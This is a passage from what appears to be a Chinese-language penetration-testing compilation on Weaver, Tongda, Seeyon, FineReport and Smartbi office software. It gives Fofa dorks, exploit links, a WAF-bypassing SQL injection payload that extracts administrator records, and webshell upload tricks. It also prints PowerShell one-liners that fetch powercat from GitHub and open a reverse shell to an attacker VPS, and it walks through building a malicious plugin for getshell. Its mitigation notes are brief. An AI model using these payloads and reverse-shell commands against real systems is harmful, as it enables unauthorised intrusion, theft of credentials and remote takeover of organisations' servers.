class="hljs-params">ps1</span>')</span>;powercat -c ip -p <span class="hljs-number">6666</span> -e cmd</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新泛微补丁</p><p>2.拦截<code>/weaver/bsh.servlet.BshServlet</code>目录的访问</p><h2 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/" target="_blank" rel="noopener">https://weaversrc.vulbox.com/</a>, 情况有所好转</p><p><strong>2. 影响组件</strong></p><p>泛微OA</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=ecologyWorkflowCenterTreeData/mobile/plugin/SyncUserInfo.jsp</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<br><a href="https://xz.aliyun.com/t/6531" target="_blank" rel="noopener">https://xz.aliyun.com/t/6531</a></p><p><strong>6. 漏洞利用</strong></p><p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现<em>数据库</em>小龙人-CSDN博客<br><a href="https://blog.csdn.net/zycdn/article/details/102494037" target="_blank" rel="noopener">https://blog.csdn.net/zycdn/article/details/102494037</a></p><p>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle<br><a href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py" target="_blank" rel="noopener">https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a></p><p>应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园<br><a href="https://www.cnblogs.com/AtesetEnginner/p/11558469.html" target="_blank" rel="noopener">https://www.cnblogs.com/AtesetEnginner/p/11558469.html</a></p><p><code>/mobile/plugin/SyncUserInfo.jsp</code> 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述</p><p><strong>7. 利用技巧</strong></p><p>1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</p><p>2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p><p>3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过<code>xssMaxLength=500</code>的时候就不进入安全检测, 修复以后是<code>xssMaxLength=1000000</code>, 所以随便你填充<code>%0a%0d</code>还是<code>空格</code>都可以绕过注入检测</p><p>4.泛微后端数据库版本存在差异, 但是可以通用检测</p><p>已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致</p><p>所以这里筛选出一个相对通用的检测手法(下面代码是python的<code>" "*800</code> 800个空格)</p><pre><code class="hljs yaml"><span class="hljs-string">"-1) "</span><span class="hljs-string">+"</span> <span class="hljs-string">"*800+ "</span><span class="hljs-string">union</span> <span class="hljs-string">select/**/1,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span> <span class="hljs-string">from</span> <span class="hljs-string">Hrmresourcemanager</span> <span class="hljs-string">where</span> <span class="hljs-string">loginid=('sysadmin'"</span></code></pre><p>老版本可以在关键字后面加 <code>/**/</code> 来绕过sql检测</p><p>新版本可以通过加入大量空格/换行来绕过sql检测</p><p>mssql, oracle中都有<code>Hrmresourcemanager</code> , 这是管理员信息表</p><p>就<code>Hrmresource</code>表中没有用户, <code>Hrmresourcemanager</code> 表中也一定会存在<code>sysadmin</code>账户</p><p>所以进行<code>union select</code>的时候一定会有数据</p><p>这里也可以使用 <code>"-1) "+" "*800+ " or/**/ 1=1 and id&lt;(5"</code></p><p>这里使用 <code>&lt;5</code> 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用</p><p><strong>8. 防护方法</strong></p><p>1.及时更新泛微补丁<br>2.泛微最好不要开放到公网<br>3.使用waf拦击</p><h2 id="泛微OA-数据库泄露漏洞"><a href="#泛微OA-数据库泄露漏洞" class="headerlink" title="泛微OA 数据库泄露漏洞"></a>泛微OA 数据库泄露漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/" target="_blank" rel="noopener">https://weaversrc.vulbox.com/</a>, 情况有所好转</p><p><strong>2. 影响组件</strong></p><p>泛微OA</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=ecology/mobile/DBconfigReader.jsp</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">https://github.com/jas502n/DBconfigReader</a></p><p><strong>6. 漏洞利用</strong></p><p>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing<br>[<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]" target="_blank" rel="noopener">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]</a>(<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver" target="_blank" rel="noopener">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver</a> Ecology OA/Weaver_Ecology_Oa_Config.py)</p><p><strong>7. 利用技巧</strong></p><p>1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 <code>pyDes.des(' ')</code><br>2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了<br>3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧</p><p><strong>8. 防护方法</strong></p><p>1.及时更新泛微补丁</p><p>2.泛微最好不要开放到公网</p><p>3.使用waf拦截sql注入</p><h2 id="通达OA-远程代码执行漏洞"><a href="#通达OA-远程代码执行漏洞" class="headerlink" title="通达OA 远程代码执行漏洞"></a>通达OA 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入</p><p><strong>2. 影响组件</strong><br>通达OA</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs groovy"><span class="hljs-string">"/images/tongda.ico"</span>&gt;Office Anywhere <span class="hljs-number">20</span>xx版 网络智能办公系统<span class="hljs-regexp">/ispirit/</span><span class="hljs-class"><span class="hljs-keyword">interface</span>/<span class="hljs-title">gateway</span>.<span class="hljs-title">php</span></span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"通达OA"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p><p>代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools<br><a href="https://www.zrools.org/2020/04/23/代码审计-通达OA-任意用户登录漏洞（匿名RCE）分析/" target="_blank" rel="noopener">https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/</a></p><p><strong>6. 漏洞利用</strong></p><p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p><p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p><p>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell<br><a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py" target="_blank" rel="noopener">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有</p><p>绕过disable_function也很简单, 直接调用<code>COM('WScript.shell')</code>组件就ok了</p><p>2.文件名结构规则如下</p><pre><code class="hljs angelscript"><span class="hljs-symbol">256@</span><span class="hljs-number">2003</span>_ <span class="hljs-number">2055499620</span>|<span class="hljs-number">123.</span> php.</code></pre><p>对应文件名为</p><pre><code class="hljs lsl"><span class="hljs-section">attach</span>/im/<span class="hljs-number">2003</span>/<span class="hljs-number">2055499620.123</span>.php</code></pre><p>因为是windows的, <code>1.php.</code> 可以绕过黑名单, 写到文件就成了 <code>1.php</code> (<del>这里是文件包含, 文件名无所谓</del>)</p><p>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个</p><p>(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)</p><p>通达OA前台任意用户伪造登录漏洞<br><a href="https://vas.riskivy.com/vuln-detail?id=33" target="_blank" rel="noopener">https://vas.riskivy.com/vuln-detail?id=33</a></p><p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用waf拦截</p><h2 id="致远-OA-A8-htmlofficeservlet-getshell-漏洞"><a href="#致远-OA-A8-htmlofficeservlet-getshell-漏洞" class="headerlink" title="致远 OA A8 htmlofficeservlet getshell 漏洞"></a>致远 OA A8 htmlofficeservlet getshell 漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞</p><p><strong>2. 影响组件</strong><br>致远 OA</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs awk"><span class="hljs-regexp">/seeyon/</span>htmlofficeservlet<span class="hljs-regexp">/seeyon/i</span>ndex.jspseeyon</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"用友-致远OA"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p><p><strong>6. 漏洞利用</strong></p><p>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list<br><a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell" target="_blank" rel="noopener">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p><p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p><p>这里还有个XXE</p><p>致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog<br><a href="https://landgrey.me/blog/8/" target="_blank" rel="noopener">https://landgrey.me/blog/8/</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题</p><p>这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊</p><p>这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64</p><pre><code class="hljs vim">from sys import <span class="hljs-built_in">argv</span>letters = <span class="hljs-string">"gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"</span>def base64_encode(input_str):    str_ascii_list = [<span class="hljs-string">'{:0&gt;8}'</span>.format(str(bin(ord(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>))                      <span class="hljs-keyword">for</span> i in input_str]    output_str = <span class="hljs-string">''</span>    equal_num = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>        temp_list = str_ascii_list[:<span class="hljs-number">3</span>]        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_list) != <span class="hljs-number">3</span>:            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(temp_list) &lt; <span class="hljs-number">3</span>:                equal_num += <span class="hljs-number">1</span>                temp_list += [<span class="hljs-string">'0'</span> * <span class="hljs-number">8</span>]        temp_str = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(temp_list)        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">6</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">18</span>]]        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list]        <span class="hljs-keyword">if</span> equal_num:            temp_str_list = temp_str_list[<span class="hljs-number">0</span>:<span class="hljs-number">4</span> - equal_num]        output_str += <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([letters[<span class="hljs-keyword">x</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])        str_ascii_list = str_ascii_list[<span class="hljs-number">3</span>:]    output_str = output_str + <span class="hljs-string">'='</span> * equal_num    <span class="hljs-keyword">return</span> output_strdef base64_decode(input_str):    str_ascii_list = [<span class="hljs-string">'{:0&gt;6}'</span>.format(str(bin(letters.<span class="hljs-built_in">index</span>(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>))                      <span class="hljs-keyword">for</span> i in input_str <span class="hljs-keyword">if</span> i != <span class="hljs-string">'='</span>]    output_str = <span class="hljs-string">''</span>    equal_num = input_str.<span class="hljs-built_in">count</span>(<span class="hljs-string">'='</span>)    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>        temp_list = str_ascii_list[:<span class="hljs-number">4</span>]        temp_str = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(temp_list)        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_str) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:            temp_str = temp_str[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span> * equal_num * <span class="hljs-number">2</span>]        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span>]        output_str += <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">x</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])        str_ascii_list = str_ascii_list[<span class="hljs-number">4</span>:]    <span class="hljs-keyword">return</span> output_str<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">2</span>:        <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>]))    elif <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">3</span>:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">'-d'</span>:            <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">print</span>(base64_encode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Seeyon OA /seeyon/htmlofficeservlet param encode/decode"</span>)        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Usage:"</span>)        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s encoded_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])t        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s -d encoded_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s -e raw_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用waf拦截</p><h2 id="致远OA-帆软报表-seeyonreport-远程代码执行"><a href="#致远OA-帆软报表-seeyonreport-远程代码执行" class="headerlink" title="[致远OA] 帆软报表 seeyonreport 远程代码执行"></a>[致远OA] 帆软报表 seeyonreport 远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点</p><p><strong>2. 影响组件</strong></p><p>帆软报表 seeyonreport</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>seeyoon.com<span class="hljs-regexp">/seeyonreport/</span>ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=<span class="hljs-number">1560911828892</span>seeyonreport</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"用友-致远OA"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p><p><strong>6. 漏洞利用</strong></p><p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p><p>xray/finereport-directory-traversal.yml at master · chaitin/xray<br><a href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml" target="_blank" rel="noopener">https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a><br><strong>7. 利用技巧</strong></p><p>1.未设置密码或者读取读取管理员密码<br><a href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892" target="_blank" rel="noopener">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</a></p><p>这里很有可能是没有设置密码的, 修改密码进入后台就可以了</p><p>如果设置里密码, 尝试这个接口 <code>/report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml</code>, 读取管理员密码, 然后使用上文的解密程序解密</p><p>2.后台getshell<br>这种后台能装插件的都随便getshell</p><p>先去下载一个指定版本的jar包</p><p>本地测试环境是9.0</p><p>下载com.fr.plugin.external-1.3.4.zip<br><a href="https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66" target="_blank" rel="noopener">https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66</a></p><p><a href="http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=" target="_blank" rel="noopener">http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=</a></p><p>编译一个恶意的LocaleFinder.class打包进去</p><p>复制LocaleFinder.class到<br><code>\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\</code></p><p>进入到插件管理界面, 上传符合规范的jar包插件即可<br>没生效就访问一下 <code>https://xxxx/seeyonreport/ReportServer?op=im</code></p><p>一般后台都是win, 可以直接使用powershell进行反弹shell</p><pre><code class="hljs reasonml">powershell <span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>;powercat -c vps_ip -p <span class="hljs-number">6666</span> -e cmd</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用waf拦截</p><h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><h2 id="Smartbi-前台SQL注入"><a href="#Smartbi-前台SQL注入" class="headerlink" title="Smartbi 前台SQL注入"></a>Smartbi 前台SQL注入</h2><p><strong>1. 漏洞简介</strong></p><p>Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.</p><p><strong>2. 影响组件</strong><br>Smartbi</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">SmartBi</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Smartbi"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）<br><a href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a></p><p>漏洞文件<br><code>vision/userListManager.jsp</code></p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doDel</span>(<span class="hljs-params"></span>)</span>{   <span class="hljs-keyword">var</span> ids = [];   <span class="hljs-comment">// 全选</span>   <span class="hljs-keyword">if</span>($(<span class="hljs-string">"#checkAll"</span>).checked){      <span class="hljs-keyword">if</span>(curRows){         curRows.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">val, index</span>)</span>{            ids.push(val.id);         });      }   }<span class="hljs-keyword">else</span>{      <span class="hljs-keyword">if</span>(curRows){         $(<span class="hljs-string">"[name='checkTr']"</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.checked){               ids.push(<span class="hljs-keyword">this</span>.id);            }         });      }   }   <span class="hljs-keyword">if</span>(ids &amp;&amp; ids.length &gt; <span class="hljs-number">0</span>){      <span class="hljs-keyword">if</span>(!canOpt()){         alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Youdonothavepermissiontodoso<span class="hljs-string">")%&gt;"</span>);         <span class="hljs-keyword">return</span>;      }      <span class="hljs-keyword">var</span> msg = <span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Suredelete?<span class="hljs-string">")%&gt;"</span>;      <span class="hljs-keyword">var</span> flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;      alert(msg, <span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Removetips<span class="hljs-string">")%&gt;"</span>, flags, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">ret</span>) </span>{         <span class="hljs-keyword">if</span> (ret == modalWindow.ID_YES) {            <span class="hljs-keyword">var</span> ret = jsloader.resolve(<span class="hljs-string">"freequery.common.util"</span>).remoteInvokeEx2(<span class="hljs-string">"BIConfigService"</span>, <span class="hljs-string">"delUsers"</span>, [ids]);            <span class="hljs-keyword">if</span>(ret &amp;&amp; ret.result == <span class="hljs-number">1</span>){               alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Deletedsuccessfully<span class="hljs-string">")%&gt;"</span>);               refresh();            }         }      }, <span class="hljs-keyword">this</span>);   }<span class="hljs-keyword">else</span>{      alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Noselectedobjectyouwanttodelete<span class="hljs-string">")%&gt;"</span>);   }}smartbi/WEB-INF/lib/smartbi-BIConfig.jar!<span class="hljs-regexp">/smartbi/</span>config/BIConfigService.classpublic int delUsers(List&lt;<span class="hljs-built_in">String</span>&gt; ids) {    boolean succ = <span class="hljs-literal">true</span>;    <span class="hljs-built_in">String</span> idStr = <span class="hljs-string">""</span>;    <span class="hljs-keyword">if</span> (ids != <span class="hljs-literal">null</span> &amp;&amp; ids.size() &gt; <span class="hljs-number">0</span>) {        <span class="hljs-keyword">for</span>(int i = <span class="hljs-number">0</span>; i &lt; ids.size(); ++i) {            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) {                idStr = <span class="hljs-string">"('"</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">"'"</span>;            } <span class="hljs-keyword">else</span> {                idStr = idStr + <span class="hljs-string">", "</span> + <span class="hljs-string">"'"</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">"'"</span>;            }        }        idStr = idStr + <span class="hljs-string">")"</span>;        Connection conn = <span class="hljs-literal">null</span>;        PreparedStatement prep = <span class="hljs-literal">null</span>;        <span class="hljs-built_in">Object</span> rs = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> {            conn = DbUtil.getRepoConnection();            conn.setAutoCommit(<span class="hljs-literal">false</span>);            <span class="hljs-built_in">String</span> sqlUser = <span class="hljs-string">"delete from t_user where c_userid in "</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserAttr = <span class="hljs-string">"delete from t_userattr where c_userid in "</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserconfig = <span class="hljs-string">"delete from t_userconfig where c_userid in "</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserRole = <span class="hljs-string">"delete from t_user_role where c_userid in "</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserGroup = <span class="hljs-string">"delete from t_group_user where c_userid in "</span> + idStr;            prep = conn.prepareStatement(sqlUser);            prep.execute();            prep = conn.prepareStatement(sqlUserAttr);            prep.execute();            prep = conn.prepareStatement(sqlUserconfig);            prep.execute();            prep = conn.prepareStatement(sqlUserRole);            prep.execute();            prep = conn.prepareStatement(sqlUserGroup);            prep.execute();            conn.commit();        } <span class="hljs-keyword">catch</span> (Exception var17) {            <span class="hljs-keyword">try</span> {                succ = <span class="hljs-literal">false</span>;                conn.rollback();            } <span class="hljs-keyword">catch</span> (SQLException var16) {                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);            }            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> 